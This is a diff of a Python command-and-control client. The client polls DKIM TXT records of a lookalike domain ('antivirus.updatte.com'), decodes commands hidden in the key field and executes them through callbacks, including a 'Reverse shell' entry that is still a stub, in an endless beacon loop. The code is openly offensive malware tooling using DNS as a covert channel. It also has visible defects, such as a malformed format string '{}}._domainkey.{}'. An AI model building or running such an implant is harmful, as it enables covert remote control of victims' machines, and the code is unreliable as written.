@@ -1,11 +1,12 @@
 #!/usr/bin/python
 # -*- coding: utf8 -*-
 
+import sys
 import base64
 import time
+import re
 import dns
 import dns.resolver
-import dns.zone
 
 
 class DNSResolverError(Exception):
@@ -55,12 +56,12 @@ class DNSResolver:
         except dns.resolver.NXDOMAIN:
             return None
 
-    def query_DKIM_record(self, domain: str):
+    def query_DKIM_record(self, key_name: str, domain: str):
         """ Get the DKIM record information by doing a TXT DNS query to the C" server IP address
         """
 
         # Get TXT records by querying default._domainkey subdomain of the C2 domain.
-        txt_records = self._query_dns_by_type('default._domainkey.{}'.format(domain), 'TXT', 2000)
+        txt_records = self._query_dns_by_type('{}}._domainkey.{}'.format(key_name, domain), 'TXT', 2000)
 
         # Get every record decoded with UTF-8
         return [j for x in txt_records for j in list(map(lambda k: k.decode('utf-8'), x.strings))]
@@ -72,9 +73,15 @@ class Client:
 
         :param c2s_ip: C2 server IP address
         :param target_domain: Domain to ask for
+
+    Attributes:
+        resolver: DNS resolver
+        function_reference: Function enumeration and information that corresponds with the one on the server side
+        key_name: Key name that identifies the client on the C2 side
     """
 
     ASCII_VALUE_CHAR = {x: chr(x) for x in range(0, 128)}
+    PK_REGEX = re.compile('p=(.*);')
 
     def __init__(self, c2s_ip: str, target_domain: str):
         self.c2s_ip = c2s_ip
@@ -83,18 +90,22 @@ class Client:
         self.function_reference = {
             1: {
                 'name': 'Print',
-                'params': '*args'
+                'params': '*args',
+                'callback': self.c2c_print
             },
             2: {
                 'name': 'Reverse shell',
-                'params': 2
+                'params': 2,
+                'callback': self.c2c_reverse_shell
             },
             3: {
                 'name': 'Sleep',
-                'params': 1
+                'params': 1,
+                'callback': self.c2c_sleep
             },
 
         }
+        self.key_name = 'alice'
 
     @property
     def port(self, p):
@@ -156,6 +167,7 @@ class Client:
         params = decrypted_text.split(separator)
 
         print('{} params:\n-{}'.format(len(params), '\n-'.join(params)))
+        return function_number, params
 
     def c2c_print(self, *args):
         """ Print function from the C2 client
@@ -171,6 +183,28 @@ class Client:
         """ Reverse shell function from the C2 client
         """
         pass
+
+    def _ask_and_execute(self):
+        """ Single asking loop iteration
+        """
+        dkim_records = self.resolver.query_DKIM_record(self.key_name, 'antivirus.updatte.com')
+        for i in dkim_records:
+            # Get the PK
+            to_decode = Client.PK_REGEX.search(i).group(1)
+            # Parse it
+            function_number, params = self.decode(to_decode)
+            # Execute the function by number and pass arguments
+            self.function_reference[function_number]['callback'](*params)
+
+    def ask_forever(self):
+        """ Infinite loop that asks the C2 server which commands to execute by sending DNS requests
+        """
+        while True:
+            try:
+                self._ask_and_execute()
+            except KeyboardInterrupt:
+                print('[!] Halted')
+                sys.exit(-1)
 
 
 if __name__ == '__main__':
